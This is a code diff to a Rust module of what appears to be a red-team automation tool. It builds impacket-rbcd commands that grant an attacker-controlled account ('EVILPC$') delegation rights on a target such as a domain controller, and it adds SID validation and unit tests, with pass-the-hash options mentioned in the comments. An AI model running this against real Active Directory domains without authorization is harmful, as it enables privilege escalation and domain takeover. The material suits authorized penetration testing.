@@ -251,9 +251,20 @@ pub fn build_addspn(args: &Value) -> Result<CommandBuilder> {
         .timeout_secs(120))
 }
 
+/// True for canonical SID strings (`S-1-5-21-…`), case-insensitively.
+///
+/// Used to reject a SID where impacket wants a sAMAccountName; see
+/// [`build_rbcd_write`].
+fn looks_like_sid(value: &str) -> bool {
+    let mut chars = value.chars();
+    matches!(chars.next(), Some('S' | 's'))
+        && chars.next() == Some('-')
+        && value.matches('-').count() >= 3
+}
+
 /// Write Resource-Based Constrained Delegation (RBCD) via impacket-rbcd.
 ///
-/// Required args: `domain`, `username`, `target_computer`, `attacker_sid`,
+/// Required args: `domain`, `username`, `target_computer`, `attacker_account`,
 ///                `dc_ip`
 /// Auth — one of (precedence: `ticket_path` > `hash` > `password`), see
 /// [`impacket_identity_auth`]:
@@ -261,9 +272,11 @@ pub fn build_addspn(args: &Value) -> Result<CommandBuilder> {
 ///   - `hash`/`nt_hash`/`ntlm_hash` — NTLM pass-the-hash (`-hashes LM:NT`)
 ///   - `password` — plaintext, folded into the identity string
 ///
-/// Optional args: `dc_host`. rbcd.py resolves the LDAP target from `-dc-host`
-/// when set and otherwise falls back to an anonymous SMB lookup of the DC's
-/// machine name, which a hardened DC refuses.
+/// Optional args: `dc_host`, `attacker_sid`. rbcd.py resolves the LDAP target
+/// from `-dc-host` when set and otherwise falls back to an anonymous SMB lookup
+/// of the DC's machine name, which a hardened DC refuses. `attacker_sid` is not
+/// passed to impacket at all; teardown uses it as the read-back needle, because
+/// the delegation attribute renders as SDDL containing raw SIDs.
 pub async fn rbcd_write(args: &Value) -> Result<ToolOutput> {
     build_rbcd_write(args)?.execute().await
 }
@@ -272,18 +285,42 @@ pub async fn rbcd_write(args: &Value) -> Result<ToolOutput> {
 ///
 /// Split out from [`rbcd_write`] so unit tests can assert on the constructed
 /// argument vector (via `args_for_test`) without spawning the binary.
+///
+/// `-delegate-from` must be a **sAMAccountName**, not a SID: rbcd.py resolves it
+/// with `(sAMAccountName=%s)` and, on a miss, logs "Account to escalate does not
+/// exist!" and returns — while still exiting 0, so the caller sees success. A
+/// SID is therefore rejected up front rather than silently no-opping.
 #[doc(hidden)]
 pub fn build_rbcd_write(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
     let target_computer = required_str(args, "target_computer")?;
-    let attacker_sid = required_str(args, "attacker_sid")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());
 
+    let attacker_account = optional_str(args, "attacker_account")
+        .filter(|s| !s.is_empty())
+        .ok_or_else(|| {
+            anyhow::anyhow!(
+                "rbcd_write requires 'attacker_account': the attacker-controlled \
+                 sAMAccountName (e.g. EVILPC$) for -delegate-from. 'attacker_sid' is not a \
+                 substitute — it is kept for teardown's read-back needle, which matches the \
+                 SDDL rendering of the delegation attribute."
+            )
+        })?;
+
+    if looks_like_sid(attacker_account) {
+        anyhow::bail!(
+            "rbcd_write: -delegate-from needs a sAMAccountName (e.g. EVILPC$), got the SID \
+             '{attacker_account}'. impacket-rbcd resolves -delegate-from via \
+             (sAMAccountName=...), so a SID matches nothing, the write is skipped, and rbcd.py \
+             still exits 0 — the failure would otherwise look like success."
+        );
+    }
+
     let cmd = CommandBuilder::new("impacket-rbcd")
         .flag("-delegate-to", target_computer)
-        .flag("-delegate-from", attacker_sid)
+        .flag("-delegate-from", attacker_account)
         .flag("-action", "write")
         .flag("-dc-ip", dc_ip)
         .flag_opt("-dc-host", dc_host);
@@ -706,6 +743,7 @@ mod tests {
             "username": "admin",
             "password": "P@ssw0rd!",
             "target_computer": "dc01$",
+            "attacker_account": "EVILPC$",
             "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
             "dc_ip": "192.168.58.10"
         });
@@ -713,15 +751,51 @@ mod tests {
         let argv = cmd.args_for_test();
         assert!(argv.iter().any(|a| a == "contoso.local/admin:P@ssw0rd!"));
         assert_eq!(flag_value(argv, "-delegate-to"), Some("dc01$"));
-        assert_eq!(
-            flag_value(argv, "-delegate-from"),
-            Some("S-1-5-21-1234567890-987654321-1122334455-1234")
-        );
+        assert_eq!(flag_value(argv, "-delegate-from"), Some("EVILPC$"));
         assert_eq!(flag_value(argv, "-action"), Some("write"));
     }
 
+    /// The SID belongs to teardown's read-back needle, never to impacket.
+    /// rbcd.py resolves `-delegate-from` with `(sAMAccountName=%s)`, so a SID
+    /// there matches nothing, `write()` returns early, and the process still
+    /// exits 0 — a silent no-op that teardown would then "revert".
     #[test]
-    fn rbcd_write_missing_attacker_sid() {
+    fn rbcd_write_rejects_a_sid_as_delegate_from() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "password": "P@ssw0rd!",
+            "target_computer": "dc01$",
+            "attacker_account": "S-1-5-21-1234567890-987654321-1122334455-1234",
+            "dc_ip": "192.168.58.10"
+        });
+        let err = match super::build_rbcd_write(&args) {
+            Ok(_) => panic!("a SID must be rejected as -delegate-from"),
+            Err(e) => e.to_string(),
+        };
+        assert!(
+            err.contains("sAMAccountName"),
+            "error should point at the account-name requirement, got: {err}"
+        );
+    }
+
+    /// A SID alone is not enough to build the command: it cannot stand in for
+    /// the account name.
+    #[test]
+    fn rbcd_write_requires_attacker_account_not_just_sid() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "password": "P@ssw0rd!",
+            "target_computer": "dc01$",
+            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
+            "dc_ip": "192.168.58.10"
+        });
+        assert!(super::build_rbcd_write(&args).is_err());
+    }
+
+    #[test]
+    fn rbcd_write_missing_attacker_account() {
         let args = json!({
             "domain": "contoso.local",
             "username": "admin",
@@ -729,7 +803,15 @@ mod tests {
             "target_computer": "dc01$",
             "dc_ip": "192.168.58.10"
         });
-        assert!(required_str(&args, "attacker_sid").is_err());
+        assert!(super::build_rbcd_write(&args).is_err());
+    }
+
+    #[test]
+    fn looks_like_sid_discriminates_sids_from_account_names() {
+        assert!(super::looks_like_sid("S-1-5-21-1-2-3-1105"));
+        assert!(super::looks_like_sid("s-1-5-21-1-2-3-1105"));
+        assert!(!super::looks_like_sid("EVILPC$"));
+        assert!(!super::looks_like_sid("SQL-SRV-01$"));
     }
 
     #[test]
@@ -927,6 +1009,7 @@ mod tests {
             "username": "admin",
             "password": "P@ssw0rd!",
             "target_computer": "dc01$",
+            "attacker_account": "EVILPC$",
             "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
             "dc_ip": "192.168.58.10"
         });
@@ -992,6 +1075,7 @@ mod tests {
             "domain": "contoso.local",
             "username": "alice",
             "target_computer": "dc01$",
+            "attacker_account": "EVILPC$",
             "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
             "dc_ip": "192.168.58.10"
         })
